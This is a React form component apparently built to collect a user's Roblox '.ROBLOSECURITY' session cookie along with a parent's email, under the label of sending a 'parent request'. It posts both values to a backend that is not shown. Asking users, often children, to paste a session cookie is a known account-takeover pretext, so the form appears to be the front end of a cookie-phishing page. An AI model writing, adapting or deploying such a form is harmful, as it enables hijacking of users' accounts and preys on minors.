import { useState } from 'react';

export default function ParentRequestForm() {
  const [roblosecurity, setRoblosecurity] = useState('');
  const [parentEmail, setParentEmail] = useState('');
  const [message, setMessage] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    setMessage('');

    const response = await fetch('/api/send-parent-request', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ roblosecurity, parentEmail }),
    });

    const data = await response.json();
    setMessage(data.message);
  };

  return (
    <form onSubmit={handleSubmit}>
      <div>
        <label>
          Roblox Security Cookie:
          <input
            type="text"
            value={roblosecurity}
            onChange={(e) => setRoblosecurity(e.target.value)}
            required
          />
        </label>
      </div>
      <div>
        <label>
          Parent Email:
          <input
            type="email"
            value={parentEmail}
            onChange={(e) => setParentEmail(e.target.value)}
            required
          />
        </label>
      </div>
      <button type="submit">Send Request</button>
      {message && <p>{message}</p>}
    </form>
  );
              }
              
